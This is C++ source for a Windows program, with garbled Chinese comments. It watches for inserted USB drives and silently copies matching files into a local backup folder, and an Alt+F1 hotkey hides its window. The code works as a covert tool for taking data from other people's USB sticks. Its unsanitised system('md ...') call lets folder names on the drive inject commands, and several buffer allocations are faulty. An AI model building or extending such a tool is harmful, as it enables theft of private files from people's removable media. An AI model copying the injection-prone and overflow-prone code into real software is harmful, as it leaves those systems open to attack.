#include <stdio.h>
#include "windows.h"
#include <Windowsx.h>
#include<Commdlg.h>  
#include "Shlwapi.h"
#include <string>
#include <vector>//ʹ���������ݽṹ
#include <list> 
//ѡ���ļ��жԻ���  
#include<Shlobj.h> 
#include<Winuser.h> 
#pragma comment(lib,"Shell32.lib")  
#pragma comment(lib,"user32.lib")  
#pragma comment(lib,"Shlwapi.lib") 
using namespace std;
#define  IDC_EDIT_1  0x101							//�����ı���С
#define  IDC_EDIT_2  0x102							//��׺��
#define  IDC_EDIT_3  0x103							//·��
#define  IDC_Button_1 0x104							//ѡ�񱣴��ļ���
#define  IDC_Button_2 0x105
#define  IDC_Button_3 0x106
#define  IDC_STATIC_1 0x107							//
HINSTANCE g_hInstance;								//ȫ�������������ַ
HANDLE	  g_hRunEvent;
HANDLE	  g_hThreads;
BOOL      g_bRun = FALSE;							//�Ƿ��������			
BOOL	  g_bIsStart = FALSE;						//ɨ������ִ��״̬
struct tagConfig
{
	TCHAR m_HouZhui[30];
	DWORD m_FileSize;
	TCHAR m_FilePaht[MAX_PATH];
}tconfig;

struct WaitForProcessingFile
{
	TCHAR tcFileName;
	TCHAR tcFilePaht;
};
vector <WaitForProcessingFile> g_vlist;
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	//MessageBox(0, 0, 0, 0);
	//printf("uMsg : %d, wParam: %d, lParam: %d \n", uMsg, wParam, lParam);
	switch (uMsg)
	{
		case WM_DESTROY:
		{	
			PostQuitMessage(0);
			break;
		}
		case WM_CREATE:
		{
			//**********************************�Ӵ��ڿؼ��ֶ�����Begin����***********************************//
			/*�ļ���Сѡ�� Begin*/
			CreateWindow(TEXT("STATIC"), TEXT("��������˵��ļ���С:"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 10, 300, 20,hwnd,(HMENU)NULL, NULL, g_hInstance, NULL);
			CreateWindow(TEXT("EDIT"), TEXT("0"), ES_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 40, 50, 20, hwnd, (HMENU)IDC_EDIT_1, NULL, g_hInstance, NULL);
			CreateWindow(TEXT("STATIC"), TEXT(" MB (0Ϊ������,��������)"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 60, 40, 200, 20, hwnd, (HMENU)NULL, NULL, g_hInstance, NULL);
			/*�ļ���Сѡ�� End*/

			/*�ļ���׺������ Begin*/
			CreateWindow(TEXT("STATIC"), TEXT("������Ҫ��ص��ļ�: (�ո�ֿ�)"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 80, 300, 20, hwnd, (HMENU)NULL, NULL, g_hInstance, NULL);
			CreateWindow(TEXT("EDIT"), TEXT("*.text *.txt *.jpg"), ES_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 110, 260, 20, hwnd, (HMENU)IDC_EDIT_2, NULL, g_hInstance, NULL);
			/*�ļ���׺������ End*/

			/*����·��	Begin*/
			CreateWindow(TEXT("STATIC"), TEXT("�ļ�����·��:"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 170, 300, 20, hwnd, (HMENU)NULL, NULL, g_hInstance, NULL);
			CreateWindow(TEXT("EDIT"), TEXT("d:\\Upan_Back"), ES_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 200, 180, 20, hwnd, (HMENU)IDC_EDIT_3, NULL, g_hInstance, NULL);
			CreateWindow(TEXT("BUTTON"), TEXT("ѡ��"), BS_PUSHBUTTON | BS_TEXT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 200, 200, 70, 20, hwnd, (HMENU)IDC_Button_1, NULL, g_hInstance, NULL);
			/*����·��	End*/

			/*��ݼ�˵�� Begin*/
			CreateWindow(TEXT("STATIC"), TEXT("��ݼ�˵��:"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 250, 200, 20, hwnd, (HMENU)NULL, NULL, g_hInstance, NULL);
			CreateWindow(TEXT("STATIC"), TEXT("Alt+F1���ش���"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 280, 200, 20, hwnd, (HMENU)NULL, NULL, g_hInstance, NULL);
			CreateWindow(TEXT("STATIC"), TEXT("Alt+F2��ʾ����"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 310, 200, 20, hwnd, (HMENU)NULL, NULL, g_hInstance, NULL);
			/*��ݼ�˵�� End*/

			CreateWindow(TEXT("BUTTON"), TEXT("��������"), BS_PUSHBUTTON | BS_TEXT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 200, 280, 70, 45, hwnd, (HMENU)IDC_Button_2, NULL, g_hInstance, NULL);


			CreateWindow(TEXT("BUTTON"), TEXT("�������"), BS_PUSHBUTTON | BS_TEXT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 350, 260, 45, hwnd, (HMENU)IDC_Button_3, NULL, g_hInstance, NULL);

			CreateWindow(TEXT("STATIC"), TEXT("״̬:"), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 10, 420, 40, 20, hwnd, (HMENU)NULL, NULL, g_hInstance, NULL);

			CreateWindow(TEXT("STATIC"), TEXT("��ֹͣ..."), SS_LEFT | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE, 50, 420, 200, 20, hwnd, (HMENU)IDC_STATIC_1, NULL, g_hInstance, NULL);
			//**********************************�Ӵ��ڿؼ��ֶ�����End����*************************************//
			break;
		}
		case WM_COMMAND:
		{
			switch (LOWORD(wParam))
			{
				case IDC_EDIT_3:
					//SetDlgItemText(hwnd, IDC_EDIT_1, TEXT("hello 308"));
					break;
				case IDC_Button_1:
				{
					TCHAR szBuffer[MAX_PATH] = { 0 };
					BROWSEINFO bi ;
					ZeroMemory(&bi, sizeof(bi));
					bi.hwndOwner = NULL;//ӵ���Ŵ��ھ����ΪNULL��ʾ�Ի����Ƿ�ģ̬�ģ�ʵ��Ӧ����һ�㶼Ҫ��������  
					bi.pszDisplayName = szBuffer;//�����ļ��еĻ�����  
					bi.lpszTitle = TEXT("ѡ��һ���ļ���");//����  
					bi.ulFlags = BIF_NEWDIALOGSTYLE;
					LPITEMIDLIST idl = SHBrowseForFolder(&bi);
					if (SHGetPathFromIDList(idl, szBuffer)) {
						SetDlgItemText(hwnd, IDC_EDIT_3, szBuffer);
					}

					break;
				}
				case IDC_Button_2:
				{
					ZeroMemory(&tconfig, sizeof(tconfig));
					//GetDlgItemText(hwnd,IDC_EDIT_1, (LPWSTR)tconfig.m_FileSize, 30);
					tconfig.m_FileSize= GetDlgItemInt(hwnd, IDC_EDIT_1, NULL, FALSE);
					GetDlgItemText(hwnd, IDC_EDIT_2,tconfig.m_HouZhui, 30);
					GetDlgItemText(hwnd, IDC_EDIT_3, tconfig.m_FilePaht, MAX_PATH);
					if (wcslen(tconfig.m_FilePaht) > 0 && tconfig.m_HouZhui > 0)
					{
						MessageBox(hwnd, L"����ɹ�", L"��ʾ", MB_OK);
					}
					break;
				}
				case IDC_Button_3:
					if (g_bRun)
					{
						ResetEvent(g_hRunEvent);
						SetDlgItemText(hwnd, IDC_Button_3, L"�������");
						SetDlgItemText(hwnd, IDC_STATIC_1, L"��ֹͣ...");
						g_bRun = FALSE;
						g_bIsStart = FALSE; //ֹͣ��������


					}
					else
					{
						SetEvent(g_hRunEvent);
						SetDlgItemText(hwnd, IDC_Button_3, L"ֹͣ���");
						SetDlgItemText(hwnd, IDC_STATIC_1, L"������...");
						g_bRun = TRUE;
					}
				break;
			}

			break;
		}
		case WM_SYSCOMMAND:
		{
			if (wParam == 61488)//��ֹ�������
			{
				printf("��ֹ������� uMsg : %d, wParam: %d, lParam: %d \n", uMsg, wParam, lParam);
				break;
			}
		}
		case WM_KEYDOWN:
		{
		}
		default:
		{
			return DefWindowProc(hwnd, uMsg, wParam, lParam);
		}
	}
}


bool IsUsbDevice(wchar_t letter)
{
	wchar_t volumeAccessPath[] = L"\\\\.\\X:";
	volumeAccessPath[4] = letter;

	HANDLE deviceHandle = CreateFile(
		volumeAccessPath,
		0,                // no access to the drive
		FILE_SHARE_READ | // share mode
		FILE_SHARE_WRITE,
		NULL,             // default security attributes
		OPEN_EXISTING,    // disposition
		0,                // file attributes
		NULL);            // do not copy file attributes

						  // setup query
	STORAGE_PROPERTY_QUERY query;
	memset(&query, 0, sizeof(query));
	query.PropertyId = StorageDeviceProperty;
	query.QueryType = PropertyStandardQuery;

	// issue query
	DWORD bytes;
	STORAGE_DEVICE_DESCRIPTOR devd;
	STORAGE_BUS_TYPE busType = BusTypeUnknown;

	if (DeviceIoControl(deviceHandle,
		IOCTL_STORAGE_QUERY_PROPERTY,
		&query, sizeof(query),
		&devd, sizeof(devd),
		&bytes, NULL))
	{
		
		busType = devd.BusType;
	}

	CloseHandle(deviceHandle);

	return BusTypeUsb == busType;
}

// ����U��
// ����:  _letter �洢U���̷�
// ����ֵ:true ��ǰ��U��
//       false ��ǰ��U��
bool findUSBStorage(wchar_t* _letter)
{
	DWORD mask = GetLogicalDrives();
	int count = 0;
	while (mask != 0)
	{
		if ((mask & 0x01) == 1)
		{
			wchar_t letter = L'A' + count;

			// �ж�ȡ�õ��̷��Ƿ���U��
			if (IsUsbDevice(letter))
			{
				wcscpy(_letter,&letter);
				return true;
			}
		}
		count++;
		mask = mask >> 1;
	}
	return false;
}

TCHAR* splist(TCHAR * str, TCHAR seg[])
{
	/*�ָ�������Ϊ����comma���ָ�������Ϊ��ָ���ģ���ֺţ��ո��*/
	TCHAR charlist[50][50] = { L"\0" };/*ָ���ָ������ַ����洢��λ�ã����ﶨ���ά�ַ�������*/
	int i = 0;
	TCHAR *substr = wcstok(str, seg);/*�����ֳɵķָ��,substrΪ�ָ���������ַ���*/

	while (substr != NULL) {
		wcscpy(charlist[i], substr);/*���·ָ���������ַ���substr������Ҫ�洢��charlsit��*/
		i++;
		//printf("%s\n", substr);
		substr = wcstok(NULL, seg);/*�ڵ�һ�ε���ʱ��strtok()����������str�ַ�����
								   ����ĵ����򽫲���str���ó�NULL��ÿ�ε��óɹ��򷵻ر��ָ��Ƭ�ε�ָ�롣*/
	}
	return *charlist;
}

// wchar_t to string
void Wchar_tToString(std::string& szDst, wchar_t *wchar)
{
	wchar_t * wText = wchar;
	DWORD dwNum = WideCharToMultiByte(CP_OEMCP, NULL, wText, -1, NULL, 0, NULL, FALSE);// WideCharToMultiByte������
	char *psText;  // psTextΪchar*����ʱ���飬��Ϊ��ֵ��std::string���м����
	psText = new char[dwNum];
	WideCharToMultiByte(CP_OEMCP, NULL, wText, -1, psText, dwNum, NULL, FALSE);// WideCharToMultiByte���ٴ�����
	szDst = psText;// std::string��ֵ
	delete[]psText;// psText�����
}
BOOL CreateDeepDirectory(LPCTSTR lpPathName,        //directory name
	LPSECURITY_ATTRIBUTES lpSecurityAttributes  // SD
)
{
	if (PathFileExists(lpPathName))       //���Ŀ¼�Ѵ��ڣ�ֱ�ӷ���
	{
		return TRUE;
	}

	string strPath = "";
	TCHAR pszSrc[MAX_PATH] = { 0 };
	wcscpy(pszSrc, lpPathName);
	TCHAR *ptoken = wcstok(pszSrc, L"\\");
	while (ptoken)
	{
		string strTmp = "";
		Wchar_tToString(strTmp, ptoken);
		strPath += strTmp;
		strPath += "\\";

		string mystring = strPath;
		int mystringSize = (int)(mystring.length() + 1);
		wchar_t* mywstring = new wchar_t[mystringSize];
		MultiByteToWideChar(CP_ACP, 0, mystring.c_str(), -1, mywstring, mystringSize);


		if (!PathFileExists(mywstring))
		{                   //����ʧ��ʱ��Ӧɾ���Ѵ������ϲ�Ŀ¼���˴���
			if (!CreateDirectory(mywstring, lpSecurityAttributes))
			{
				printf("����ʧ�� ����%d", GetLastError());
				delete[] mywstring;
				continue;
			}
		}
		delete[] mywstring;
		ptoken = wcstok(NULL, L"\\");
	}
	return TRUE;
}
vector<WaitForProcessingFile> g_vCreatFilee;
bool CreatFileTreeforlist(wchar_t* filepaht)
{
	WIN32_FIND_DATA ffd;
	LARGE_INTEGER filesize;
	TCHAR szFullPath[MAX_PATH];//����·��
	HANDLE hFind = INVALID_HANDLE_VALUE;
	list<WIN32_FIND_DATA > m_lFfdList;
	
	TCHAR t[MAX_PATH] = { L"\0" };
	wsprintf(t, L"%S:\\*.*", filepaht);
	hFind = FindFirstFile(t, &ffd);
	if (INVALID_HANDLE_VALUE == hFind)
	{
		printf("FindFirstFile error");
		return 0;
	}

	do
	{
		m_lFfdList.push_back(ffd);
	} while (FindNextFile(hFind, &ffd) != 0); //û���ļ�ʱ �Ƴ�
	//���ڵ����
	list <WIN32_FIND_DATA >::iterator m_lFIter;
	while (m_lFfdList.size())
	{
		WIN32_FIND_DATA  m_wFIter = (WIN32_FIND_DATA)*m_lFIter;

		m_lFIter=m_lFfdList.begin();

		TCHAR t[MAX_PATH] = { L"\0" };
		wsprintf(t, L"%S:", filepaht);
		string sAddPath = "";
		Wchar_tToString(sAddPath, t);
		sAddPath += "\\";
		string addstrignTem = "";
		Wchar_tToString(addstrignTem, m_wFIter.cFileName);
		sAddPath += addstrignTem;


		//������ļ��Ļ���ӵ�������
		if (m_wFIter.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{

			
			
			sAddPath += "\\*.*";
			//ѭ��Ŀ¼�¼��ӽڵ�
			WIN32_FIND_DATA m_ffd;

			string mystring = sAddPath;
			int mystringSize = (int)(mystring.length() + 1);
			wchar_t* mywstring = new wchar_t[mystringSize];
			MultiByteToWideChar(CP_ACP, 0, mystring.c_str(), -1, mywstring, mystringSize);
			
			
			HANDLE hFind1 = INVALID_HANDLE_VALUE;
			hFind1 = FindFirstFile(mywstring, &m_ffd);
			
			//list<WIN32_FIND_DATA > m_lFfdListNodes;
			//list <WIN32_FIND_DATA >::iterator m_lFIterNode;
			if (INVALID_HANDLE_VALUE == hFind1)
			{
				
				printf("FindFirstFile error %d,Ȩ�޲���ʹ�ù���ԱȨ��",GetLastError());
				m_lFfdList.pop_front();
				continue;
			}
			do
			{
				m_lFfdList.push_back(m_ffd);
			} while (FindNextFile(hFind1, &m_ffd) != 0); //û���ļ�ʱ �Ƴ�
			printf("====================================Ŀ¼һ�������� \n");
			delete[] mywstring;
			FindClose(hFind1);
		}
		else
		{
			//������ļ�
		}
		m_lFfdList.pop_front();
	}

	FindClose(hFind);
	return true;
}

bool CreatFileTree(TCHAR filePath[], DWORD  &Size, DWORD  &Num, DWORD &Directory)
{
	printf("%d \n", GetLastError());
	int s1,s2,s3,s4 = 0;
	TCHAR szFind[MAX_PATH];       //����һ��Ҫ�ҵ��ļ�·������
	WIN32_FIND_DATA FindFileData;//WIN32_FIND_DATA�ṹ������һ����FindFirstFile, FindFirstFileEx, ��FindNextFile�������ҵ����ļ���Ϣ
	HANDLE hFind;                //����һ����� ����FindFirstFile()���ص�ֵ

	wcscpy(szFind, filePath);     //�ѴӺ��ߵ�ַ��ʼ�Һ���NULL���������ַ�����ֵ��ǰ�߿�ʼ�ĵ�ַ�ռ�   
	wcscat(szFind, L"\\*.*");      //�Ѻ�����ָ�ַ�����ӵ�ǰ�߽�β��(����ǰ�߽�β����'\0')�����'\0'������ͨ��������Ŀ¼�µ������ļ�������Ŀ¼

	hFind = FindFirstFile(szFind, &FindFileData);  //FindFirstFile��������HANDLE���͵�ֵ ����FILE_ATTRIBUTE_DIRECTORY �����ļ���һ��Ŀ¼�ļ�

												   //ͨ��FindFirstFile()����,���ݵ�ǰ���ļ����·�����Ҹ��ļ����Ѵ������ļ���������Զ�ȡ��WIN32_FIND_DATA�ṹ��ȥ  
	if (INVALID_HANDLE_VALUE == hFind)             //������ص���INVALID_HANDLE_VALUE����Ŀ¼������
	{
		if (GetLastError() == 5)
		{
			printf("��ʹ�ù���ԱȨ�ޣ�\n");
			return 0;
		}
		else {
			printf("Ŀ¼�����ڣ�\n");
			return 0;
		}
	}

	while (1)
	{   
		if (g_bIsStart==0)
		{
			printf("��������ֹͣ ��\n");
			break;
		}
		//��Ϊ FindFirstFile���ص� findData �� dwFileAttributes���ֵ��һ����ϵ�ֵ
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) //��λ�����������ж����ҵ�����Ŀ�ǲ����ļ���
		{
			if (FindFileData.cFileName[0] != '.')                        //ÿ��Ŀ¼���и�..Ŀ¼���Է�����һ�㡣������Ƿ���Ŀ¼
																		 //.��ʾ��ǰĿ¼����Ϊÿ��Ŀ¼���涼������Ĭ��Ŀ¼����..��.�ֱ��ʾ��һ��Ŀ¼�͵�ǰĿ¼
			{
				Directory++;               //�ļ��и�����һ
				wcscpy(szFind, filePath);
				wcscat(szFind, L"\\");
				wcscat(szFind, FindFileData.cFileName);
				CreatFileTree(szFind, Size, Num, Directory);                   //�����ǰ�ļ���Ŀ¼�ļ�����ݹ����findFile 
			}
		}
		else
		{
			
			if (lstrcmp(FindFileData.cFileName, TEXT("."))!= 0 || lstrcmp(FindFileData.cFileName, TEXT("..")) != 0)
			{
				Num++;//�ļ�������һ
				Size += (long)(FindFileData.nFileSizeLow / 1024 );            //���ļ��Ĵ�С����ͳ��  FindFileData.nFileSizeLow���ֽڴ�С
			wprintf(L"----%s\\%s------------ %d�ֽ� \n\r", filePath, FindFileData.cFileName, FindFileData.nFileSizeLow);//���Ŀ¼�µ��ļ���·�������ƺʹ�С
				printf("%d \n", GetLastError());
				//s1 = 
				if (tconfig.m_FileSize == 0 || tconfig.m_FileSize * 1024 * 1024 > FindFileData.nFileSizeLow)
				{
					
					TCHAR t[MAX_PATH] = { 0 };
					wsprintf(t, L"%s\\%s", filePath, FindFileData.cFileName);

					TCHAR*pExt = PathFindExtension(t);
		
					wchar_t * pwc = (wchar_t *)wcsstr(tconfig.m_HouZhui, pExt);
					if ( (wcslen(pExt)!=0) &&( pwc != NULL))
					{
						
						printf("%s", FindFileData.cAlternateFileName);

						//TCHAR newtlp[wcslen(tconfig.m_FilePaht)] = { L"/0" };
						TCHAR* newt2 = (TCHAR*)malloc(wcslen(filePath));
						if (newt2 == NULL)
						{
							printf("�ڴ治������\n");
							return 0;
						}
						wcscpy(newt2, filePath);
						TCHAR* tlp1 = &newt2[2];
						TCHAR ts[MAX_PATH] = { 0 };
						wcscpy(ts, tconfig.m_FilePaht);
						wcscat(ts, tlp1);

						TCHAR szt[MAX_PATH] = { L"\0" };
						wsprintf(szt, L"md %s", ts);
						char cschar[MAX_PATH] = { "\0" };
						int iLength;
						//��ȡ�ֽڳ���   
						iLength = WideCharToMultiByte(CP_ACP, 0, szt, -1, NULL, 0, NULL, NULL);
						//��ptcharֵ����pchar    
						WideCharToMultiByte(CP_ACP, 0, szt, -1, cschar, iLength, NULL, NULL);
						//WinExec(cschar, SW_HIDE);
						printf("%s \n",cschar);
						//system(cschar);

						TCHAR* tlp = &t[2];
						TCHAR* newt = (TCHAR*)malloc(wcslen(tconfig.m_FilePaht));
						if (newt != NULL)
						{
							wcscpy(newt, tconfig.m_FilePaht);
							wcscat(newt, tlp);


							TCHAR szt[MAX_PATH] = { L"\0" };
							wsprintf(szt, L"copy %s %s", t, newt);
							char cschar[MAX_PATH] = { "\0" };
							int iLength;
							//��ȡ�ֽڳ���   
							iLength = WideCharToMultiByte(CP_ACP, 0, szt, -1, NULL, 0, NULL, NULL);
							//��ptcharֵ����pchar    
							WideCharToMultiByte(CP_ACP, 0, szt, -1, cschar, iLength, NULL, NULL);

							//WinExec(cschar, SW_HIDE);
							printf("%s \n", cschar);
							printf("%d \n", GetLastError());
						//	system(cschar);
							//if (!CopyFile(t, newt, 0))
							//{
							//	printf("����ʧ�� ԭ��%d\n", GetLastError());
								//return 0;
							//}
						}
					   // free(newt);
						//free(newt2); 
					}
				}
			}
		}
		s1 = GetLastError();
		if (FindNextFile(hFind, &FindFileData) == 0)
		{
		
			return 0;
		}
			//��������FindFirstFile������������ļ�    �����ʾ�ɹ������ʾʧ��
			                                                   //���Ϊ0ʱ��ִ��break
		s2 = GetLastError();
	}
	s3=GetLastError();
	FindClose(hFind);//�رվ��
	s4 = GetLastError();

	printf("==============>%d %d %d %d \n", s1, s2, s3, s4);
	return 0;
}

DWORD WINAPI CopyProc(LPARAM lparam)
{
	DWORD num = 0;
	TCHAR srcFileName[MAX_PATH] = { 0 };//Դ�ļ����� u������ļ�
	TCHAR dstFileName[MAX_PATH] = { 0 };//���Ƶ�Ŀ���ļ���
	TCHAR dstFilePath[MAX_PATH] = {0};//���Ƶ�·����

	wsprintf(srcFileName, L"%s\\*.*", (TCHAR*)lparam);
	
	WIN32_FIND_DATA filefind;
	HANDLE h = FindFirstFile(srcFileName, &filefind);
	while (FindNextFile(h,&filefind)!=0)
	{
		//wsprintf(srcFileName,L"%s\\%s",())
		wsprintf(srcFileName, L"%s\\%s", (TCHAR *)lparam, filefind.cFileName);
		if(filefind.cFileName[0] == L'.' || (filefind.cFileName[0] == L'.' && filefind.cFileName[1] == L'.'))
		{
			continue;
		}
		if (filefind.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{

		//	wcscpy(dstFilePath, srcFileName);
			HANDLE hh= CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)CopyProc, srcFileName, NULL,NULL);

			if (hh==NULL)
			{
				printf("error %d \n", GetLastError());
			}
			WaitForSingleObject(hh, INFINITE);
			CloseHandle(hh);
		}
		else
		{
			if (tconfig.m_FileSize != 0 && tconfig.m_FileSize * 1024 * 1024 < filefind.nFileSizeLow)
			{
				continue;
			}

			TCHAR*pExt = PathFindExtension(srcFileName);
			wchar_t * pwc = (wchar_t *)wcsstr(tconfig.m_HouZhui, pExt);
			if ((wcslen(pExt) == 0) || (pwc == NULL))
			{
				printf("�����Ϻ�׺�����ļ����� %S \n", srcFileName);
				continue;
			}
			
			/*�õ�Ŀ��Ŀ¼�ļ� dstFileName*/
			TCHAR* newt2 = (TCHAR*)malloc(sizeof(dstFileName));
			if (newt2 == NULL)
			{
				printf("�ڴ治������\n");
				return 0;
			}
			memset(newt2, 0, sizeof(dstFileName));
			memcpy_s(newt2, sizeof(dstFileName),srcFileName, sizeof(srcFileName));
			TCHAR* tlp1 = &newt2[2]; //�ѵ�ַ����tlp1
			TCHAR ts[MAX_PATH] = { L"\0" };
			wcscpy(ts, tconfig.m_FilePaht);

			wcscat(ts, tlp1);
			wcscpy(dstFileName,ts);
			free(newt2);



			//�õ�Ŀ��Ŀ¼ dstFilePath    Դ�ļ���srcFileName
			
			DWORD cFileNameLen= wcslen(filefind.cFileName);
			DWORD dstFileNameLen = wcslen(ts);
			//TCHAR* tlp = (TCHAR*)malloc(dstFileNameLen - cFileNameLen);
			TCHAR tlp[MAX_PATH] = { L"\0" };
			//wcscpy(tlp, ts[dstFileNameLen - cFileNameLen]);
			for (DWORD i = 0; i < dstFileNameLen - cFileNameLen; i++)
			{
				tlp[i] = ts[i];
			}
			wcscpy(dstFilePath, tlp);
			
			if (PathFileExists(dstFilePath) == FALSE)
			{
				//ת���ֽ� ִ�д���Ŀ¼
				TCHAR szt[MAX_PATH] = { L"\0" };
				wsprintf(szt, L"md %s", dstFilePath);
				char cschar[MAX_PATH] = { "\0" };
				int iLength;
				//��ȡ�ֽڳ���   
				iLength = WideCharToMultiByte(CP_ACP, 0, szt, -1, NULL, 0, NULL, NULL);
				//��ptcharֵ����pchar    
				WideCharToMultiByte(CP_ACP, 0, szt, -1, cschar, iLength, NULL, NULL);

				//WinExec(cschar, SW_HIDE);
				system(cschar);
				printf("%s \n", cschar);
			}
			CopyFile(srcFileName, dstFileName, false);
			
			continue;
		}

	}
	//CloseHandle(h);
	return 0;
}

DWORD WINAPI ThreadProc(LPVOID)
{
	wchar_t* wchPan[20] = {L"\0"};
	
	//ÿ��һ����ɨ�������Ϣ������Ƿ�����¿��ƶ�Ӳ�̺�U��
	while (true)
	{
		
		DWORD dwWaitResult = WaitForSingleObject(g_hRunEvent, INFINITE);
		switch (dwWaitResult)
		{
			case WAIT_OBJECT_0:
			{	
				wchar_t wc[] = {L"\0"};
				bool isUsb = findUSBStorage(wc);
				if (isUsb)
				{
					/*
					for (DWORD i =0;i<sizeof(wchPan)/sizeof(wchPan[0]);i++)
					{
						if (wchPan[i] == wc)
						{
							printf("============��u���Ѿ����� %s================\n", wchPan[i]);
						}
						else {

							wchPan[i] = wc;
							printf("============����Ӳ���� %s================\n", wchPan[i]);
						}
					}*/
					if (g_bIsStart)
					{
						//����ɨ����������Ļ����Ͳ�������ɨ��
						continue;
					}
					else
					{
						g_bIsStart = TRUE;
						printf("============�������̿�ʼ���ļ���================\n");
						//Todo::�����ļ�������
						
						DWORD Size = 0, Num = 0, Directory = 0;    //����SizeΪ�ļ���С��NumΪ�ļ�������DirectoryΪ�ļ��и���
						TCHAR input[MAX_PATH];             //���������ļ�·�����ַ�����
						//printf("������Ҫ������Ŀ¼���磺C:\\\\windows �� C:\\\\Documents and Settings\n");
						wsprintf(input,L"%S:", wc);
						//CreatFileTree(input, Size, Num, Directory);//ִ���Ӻ���findFile
						HANDLE h = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)CopyProc, input, NULL, NULL);
						WaitForSingleObject(h, INFINITE);
						if (h == NULL)
						{
							printf("CreateThread error %d", getchar());
						}
						
					//	wprintf(L"\n�ܹ���С��%lldKB\n�ļ�������%lld\n�ļ��и�����%lld\n�ļ�ƽ����С��%lldKB\nÿ��Ŀ¼ƽ���ļ�������%lld\n\n", Size, Num, Directory, Size / Num, Num / Directory);
						printf("----------------------------%d \n", GetLastError());
						//WaitForProcessingFile file;
						//g_vlist.push_back(st);
					}
					
				}
				else
				{
					g_bIsStart = FALSE;
				}
				break;
			}
			default:
				printf("Wait error (%d)\n", GetLastError());
				return 0;
		}
		//Sleep(1000);
	}
}


int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	//1,���崰�ڽṹ�壬����ע�ᴰ����;
	AllocConsole();
	freopen("CONOUT$", "w", stdout);
	g_hInstance = hInstance;
	WNDCLASS wMainClass;
	ZeroMemory(&wMainClass, sizeof(wMainClass));
	wMainClass.lpszClassName = L"U��͵���� by bcjc308";
	wMainClass.hbrBackground =(HBRUSH) COLOR_WINDOW;
	wMainClass.lpfnWndProc = WindowProc;
	wMainClass.hInstance = g_hInstance;
	if (!RegisterClass(&wMainClass))
	{
		printf("ע�ᴰ����ʧ��!");
		return 0;
	} 
	//2,��������
	HWND hwndMain = CreateWindow(L"U��͵���� by bcjc308", L"U��͵���� by bcjc308", WS_OVERLAPPEDWINDOW^WS_THICKFRAME, 400, 150, 300, 500, NULL, NULL, g_hInstance, NULL);
	if (hwndMain == NULL)
	{
		printf("���ڴ���ʧ��!");
		return 0;
	}
	ShowWindow(hwndMain, SW_SHOW);

	//3,ע��ȫ�ֿ�ݼ���Ϣ F1 F2
	if (!RegisterHotKey(NULL,1,MOD_ALT | MOD_NOREPEAT, VK_F1)) 
	{
		printf("Hotkey 'ALT+F1' registered, using MOD_NOREPEAT flag\n");
	}
	if (!RegisterHotKey(NULL, 1, MOD_ALT | MOD_NOREPEAT, VK_F2))  
	{
		printf("Hotkey 'ALT+F2' registered, using MOD_NOREPEAT flag\n");
	}

	g_hRunEvent =CreateEvent(NULL, TRUE, false, L"RunEvent");
	if (g_hRunEvent == NULL)
	{
		printf("CreateEvent failed (%d)\n", GetLastError());
		return 0;
	}
	LPDWORD lpThreadId = 0;
    g_hThreads= CreateThread(NULL, 1024 * 1024*1024, ThreadProc, NULL, 0, lpThreadId);
	if (g_hThreads == NULL)
	{
		printf("CreateThread failed (%d)\n", GetLastError());
		return 0;
	}
	//4,��ȡ��Ϣ
	MSG msg;
	ZeroMemory(&msg, sizeof(msg));
	BOOL bRet = 0;
	while (bRet = GetMessage(&msg, NULL, 0, 0) != 0)
	{
		if (bRet==-1)
		{
			printf("��ȡ��Ϣ����ʧ�ܣ������룺%d", GetLastError());
				return 0;
		} 
		/*��������ʾ�����ڽ��� Begin*/
		else if (msg.message == WM_HOTKEY)
		{
			
			if (msg.lParam == 7340033) 
			{
				ShowWindow(hwndMain, SW_HIDE);
				printf("f1 \n");
				continue;
			}
			if (msg.lParam == 7405569)
			{
				ShowWindow(hwndMain, SW_SHOW);
				printf("f2 \n");
				continue;
			}
		}
		/*��������ʾ�����ڽ���End*/
		else
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

	}

	FreeConsole();
	CloseHandle(g_hRunEvent);
	return 1;

}
